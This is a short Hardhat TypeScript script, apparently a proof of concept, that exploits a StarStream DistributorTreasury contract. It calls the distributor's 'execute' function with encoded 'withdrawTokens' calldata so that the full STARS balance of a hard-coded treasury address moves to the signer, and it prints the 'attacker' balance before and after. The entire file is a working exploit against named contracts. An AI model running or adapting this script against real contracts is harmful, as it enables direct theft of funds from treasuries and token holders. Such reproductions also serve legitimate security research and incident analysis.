import hre from "hardhat"
import { IDistributorTreasury__factory, IERC20__factory} from "../typechain";

async function main() {
    const [signer] = await hre.ethers.getSigners();
    const stars = IERC20__factory.connect("0xb26F58f0b301a077cFA779c0B0f8281C7f936Ac0",signer);
    const distributorTreasury = IDistributorTreasury__factory.connect("0x6f99b960450662d67bA7DCf78ac959dBF9050725",signer);
    const starstreamTreasuryAddress = "0x1075daD8CFd8bCbCfc7bEB234e23D507990C90e9"

    console.log("STARS balance of attacker:",hre.ethers.utils.formatUnits(await stars.balanceOf(signer.address),await stars.decimals()))
    console.log("Exploiting...")
    const withdrawTokensCallData = IDistributorTreasury__factory.createInterface().encodeFunctionData('withdrawTokens',[stars.address,signer.address,await stars.balanceOf(starstreamTreasuryAddress)]);
    await distributorTreasury.execute(starstreamTreasuryAddress, 0, withdrawTokensCallData);
    console.log("Exploit complete.")
    console.log("STARS balance of attacker:",hre.ethers.utils.formatUnits(await stars.balanceOf(signer.address),await stars.decimals()))
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});